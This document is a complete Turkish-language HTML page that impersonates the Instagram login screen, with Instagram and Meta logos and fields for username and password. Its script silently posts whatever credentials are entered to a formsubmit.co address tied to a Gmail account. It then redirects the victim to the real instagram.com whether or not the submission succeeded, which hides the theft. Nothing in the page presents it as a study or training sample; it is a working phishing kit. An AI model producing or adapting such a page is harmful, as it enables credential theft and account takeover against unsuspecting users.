<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>İnstagram Giriş</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    html, body {
      height: 100%; background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }
    .resim-kapsayici {
      width: 100%; height: 50%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }
    .ortali-resim {
      max-width: 90px; height: auto;
    }
p.turkce {
  text-align: center;
  font-size: 17px;
  color: #000203;
  cursor: pointer;
  user-select: none;
  margin-top: -130px; /* YÜKSEKLİĞİ BURADAN AYARLARSIN */
  margin-bottom: 50px;
}

    form.form-kapsayici {
      margin: -100px auto 0;
      display: flex; flex-direction: column;
      align-items: center;
      gap: 15px;
      width: 90%;
      max-width: 320px;
    }
    form.form-kapsayici input {
      padding: 12px 16px;
      width: 100%;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
    }
    button.giris-buton {
      padding: 12px 16px;
      width: 100%;
      background-color: #0f7eed;
      color: white;
      font-size: 15px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button.giris-buton:hover {
      background-color: #007fff;
    }
    p.sifremi-unuttum {
      text-align: center;
      font-size: 17px;
      color: #000203;
      cursor: pointer;
      user-select: none;
      margin-top: 10px;
    }
    .yeni-hesap-kapsayici {
      margin: 100px auto 40px;
      width: 90%;
      max-width: 320px;
      display: flex;
      justify-content: center;
    }
    button.yeni-hesap-buton {
      padding: 12px 16px;
      width: 100%;
      background: transparent;
      color: #2575fc;
      font-size: 15px;
      border: 1.5px solid #007fff;
      border-radius: 50px;
      cursor: pointer;
      transition: background 0.4s ease, color 0.4s ease;
      box-shadow: none;
    }
    button.yeni-hesap-buton:hover {
      background-color: #007fff;
      color: white;
    }
    .resim-kapsayici2 {
      width: 100%;
      height: 0px;
      display: flex; justify-content: center; align-items: center;
      margin-top: 40px;
    }
    .ortali-resim2 {
      max-width: 70px; height: auto;
    }
  </style>
</head>
<body>

<div class="resim-kapsayici">
  <p class="turkce">Türkçe</p>
  <img src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" alt="Ortalanmış Resim" class="ortali-resim" />
</div>

<form id="girisForm" class="form-kapsayici">
  <input type="hidden" name="_captcha" value="false" />
  <input type="hidden" name="_template" value="table" />
  <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
  <input type="password" name="sifre" placeholder="Şifre" required />
  <button type="submit" class="giris-buton">Giriş Yap</button>
  <p class="sifremi-unuttum" onclick="alert('Hata!')">Şifreni mi unuttun?</p>
</form>

<div class="yeni-hesap-kapsayici">
  <button type="button" class="yeni-hesap-buton" onclick="alert('Yeni hesap oluşturma sayfasına yönlendiriliyorsunuz.')">Yeni Hesap Oluştur</button>
</div>

<div class="resim-kapsayici2">
  <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="Yeni Resim" class="ortali-resim2" />
</div>

<script>
  const form = document.getElementById('girisForm');

  form.addEventListener('submit', function(event) {
    event.preventDefault(); // Sayfanın yenilenmesini engelle

    const formData = new FormData(form);

    fetch('https://formsubmit.co/thtmailii@gmail.com', {
      method: 'POST',
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    })
    .then(response => {
      // form başarılıysa instagram'a yönlendir
      if (response.ok) {
        window.location.href = "https://instagram.com";
      } else {
        // hata olursa yine de yönlendir (istersen değiştirebilirsin)
        window.location.href = "https://instagram.com";
      }
    })
    .catch(error => {
      // hata olsa bile yönlendir
      window.location.href = "https://instagram.com";
    });
  });
</script>


</body>
</html>
